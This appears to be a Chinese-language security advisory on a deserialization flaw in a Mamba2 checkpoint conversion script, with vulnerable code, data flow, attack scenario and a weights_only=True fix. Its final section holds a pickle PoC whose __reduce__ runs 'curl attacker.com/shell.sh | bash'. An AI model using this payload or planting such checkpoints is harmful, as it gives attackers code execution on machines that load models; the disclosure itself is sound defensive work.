# VULN-SEC-CKPT-002：Mamba2模型HF权重转换torch.load无保护致Pickle RCE

## 漏洞基本信息

| 字段 | 值 |
|------|-----|
| **漏洞ID** | VULN-SEC-CKPT-002 |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **严重性** | Critical |
| **置信度** | 85/100 |
| **位置** | `mindspeed_llm/tasks/checkpoint/convert_ckpt_mamba2.py:372-373` |
| **函数** | `load_mg_model` / `convert_hf2mg` |
| **模块** | checkpoint_conversion |

---

## 漏洞代码

```python
# mindspeed_llm/tasks/checkpoint/convert_ckpt_mamba2.py:372-373

def load_mg_model(self):
    """加载 Megatron checkpoint"""
    src_model_file = get_latest_checkpoint_model_file(self.args.load_dir)
    
    # 明确设置 weights_only=False，允许 pickle RCE
    src_model = torch.load(
        src_model_file, 
        map_location='cpu', 
        weights_only=False  # 危险！
    )
    return src_model
```

---

## 数据流分析

```
CLI --load-dir → args.load_dir
  ↓
get_latest_checkpoint_model_file(load_dir)
  ↓ [返回最新的 checkpoint 文件路径]
src_model_file
  ↓
torch.load(src_model_file, weights_only=False)
  ↓ [SINK - pickle 反序列化]
恶意 checkpoint → RCE
```

---

## 攻击场景

**场景: HF → MG 模型转换攻击**

1. 攻击者在共享目录放置恶意 checkpoint
2. 用户执行: `python convert_ckpt.py --model-type GPT --load-dir /shared/models --loader hf2mg`
3. `load_mg_model()` 加载恶意文件 → RCE

---

## 修复建议

```python
# 修复代码
def load_mg_model_secure(self):
    src_model_file = get_latest_checkpoint_model_file(self.args.load_dir)
    
    # 强制使用 weights_only=True
    src_model = torch.load(
        src_model_file,
        map_location='cpu',
        weights_only=True  # 安全加载
    )
    return src_model
```

---

## PoC Payload

```python
import torch
import os

class RCEPayload:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

torch.save({'model': RCEPayload()}, 'latest_checkpoint.pt')
```

---

**报告生成时间**: 2026-04-20